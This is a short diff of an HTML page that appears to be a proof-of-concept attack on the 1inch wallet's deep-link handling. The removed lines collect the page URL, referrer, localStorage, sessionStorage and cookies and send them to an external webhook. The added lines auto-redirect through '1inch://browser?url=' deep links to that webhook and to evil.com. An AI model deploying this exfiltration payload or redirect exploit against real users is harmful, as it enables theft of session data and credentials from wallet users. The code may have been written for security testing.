@@ -1,19 +1,6 @@
-<!DOCTYPE html>
-<html>
-<body>
-<button onclick="read()">Read Data</button>
-<pre id="out"></pre>
+<a href="https://app.1inch.io/#/1/swap/ETH/USDT">Link 1</a>
+<a href="1inch://browser?url=https://webhooksite.net/9782dc22-d216-43c9-a513-905aa2d97d00">Link 2</a>
 <script>
-function read(){
-  let out = "";
-  out += "URL: " + location.href + "\n";
-  out += "Referrer: " + document.referrer + "\n";
-  out += "localStorage: " + JSON.stringify(localStorage).slice(0,2000) + "\n";
-  out += "sessionStorage: " + JSON.stringify(sessionStorage).slice(0,2000) + "\n";
-  out += "cookies: " + document.cookie + "\n";
-  document.getElementById('out').innerText = out;
-  fetch('https://webhooksite.net/9782dc22-d216-43c9-a513-905aa2d97d00?data=' + encodeURIComponent(out));
-}
+setTimeout(()=>{ location.href='https://app.1inch.io/#/1/swap/ETH/USDT'; }, 500);
+setTimeout(()=>{ location.href='1inch://browser?url=https://evil.com'; }, 1000);
 </script>
-</body>
-</html>
